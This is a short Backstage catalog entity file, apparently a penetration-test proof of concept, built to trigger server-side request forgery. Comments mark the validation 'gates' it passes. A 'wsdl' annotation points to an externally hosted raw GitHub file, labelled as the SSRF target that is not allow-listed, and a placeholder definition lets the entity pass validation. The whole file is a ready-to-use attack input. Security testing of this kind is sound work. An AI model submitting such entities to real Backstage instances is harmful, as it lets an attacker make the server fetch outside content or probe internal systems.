apiVersion: backstage.io/v1alpha1
kind: API                      # gate #1
metadata:
  name: pentest-soap-ssrf
  annotations:
    wsdl: https://raw.githubusercontent.com/testerprav/pravtest/refs/heads/main/test.wsdl   # gate #4 — THE SSRF target (not allow-listed)
spec:
  type: soap                   # gate #2
  lifecycle: experimental
  owner: guest
  definition: |                # required for kind: API, so the entity passes validation
    placeholder
